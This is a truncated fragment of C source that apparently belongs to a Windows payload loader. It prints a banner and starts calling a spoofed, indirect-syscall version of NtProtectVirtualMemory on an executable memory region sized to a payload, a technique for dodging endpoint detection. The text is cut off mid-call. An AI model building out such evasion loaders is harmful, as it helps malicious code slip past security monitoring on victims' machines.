...
#include <stdio.h>
#include "../common.h"
#include "stackSpoofingIndirectSyscalls.h"
...
int main(int argc, char* argv[]) {
    ...
    printf("[*] VirtualProtect with Stack Spoofing & Indirect Syscall\n");
    PVOID baseAddr = execMem;
    SIZE_T regionSize = payloadSize;
    ULONG oldProtect = 0;

    NTSTATUS status = SpoofedNtProtectVirtualMemory(
        &ctx, GetCurrentProcess(), &baseAddr, &regionSize,
